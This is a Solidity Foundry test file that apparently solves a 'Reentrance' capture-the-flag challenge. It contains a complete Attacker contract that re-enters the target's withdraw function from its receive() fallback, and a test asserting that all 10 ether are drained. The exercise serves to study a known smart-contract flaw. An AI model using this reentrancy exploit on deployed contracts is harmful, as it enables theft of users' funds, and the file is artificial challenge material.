//SPDX-Licence-Identifier: MIT

pragma solidity ^0.8.13;

import {Test} from "forge-std/Test.sol";
import {Reentrance} from "../src/Reentrance.sol";
import {console} from "forge-std/console.sol";

contract ReentranceTest is Test {
    Reentrance public target;
    Attacker public attacker;
    uint256 public constant INITIAL_BALANCE = 10 ether;

    function setUp() public {
    // step 1: Deploy the target contract
      target = new Reentrance();

    // step 2: simulating the initial deposit of 10 ether
    vm.deal(address(target), INITIAL_BALANCE);

    // step 3: Deploy the attacker contract
    attacker = new Attacker(payable(address(target)));

    // step 4: Fund the attacker contract with 1 ether
    vm.deal(address(attacker), 1 ether);

    }

    function testReentrancy() public {

        //step 5: log the initial balance of the contracts
        console.log("Initial balcnace of the target contract:" , address(target).balance);
        console.log("Initial balance of the attacker contract:" , address(attacker).balance);

        //step 6: execute the attack
        attacker.attack();

        //step 7: log the final balance of the contracts
        console.log("Final balance of the target contract:" , address(target).balance);
        console.log("Final balance of the attacker contract:" , address(attacker).balance);

        //step 8: Check that the attacker has drained all the funds from the target contract
        assertEq(address(target).balance ,0 ,"Target contract should be drained ");
        assertEq(address(attacker).balance , INITIAL_BALANCE + 1 ether , "Attacker balance should be increased");


    }
}

contract Attacker {
    Reentrance public target;
    uint256 public initialDeposite;

    constructor(address payable _target) {
        target = Reentrance(_target);
    }

    function attack() external payable {
        //1.Deposite some ether into the target contract
        initialDeposite = 1 ether;
        target.donate{value: initialDeposite}(address(this));

        //2. Call the witdraw function to start the reentrancy attack
        target.withdraw(initialDeposite);
    }


    //3. Implement a fallback function to receive the funds
    receive() external payable {
        if(address(target).balance >= initialDeposite){
                target.withdraw(initialDeposite);
        }
    }
}
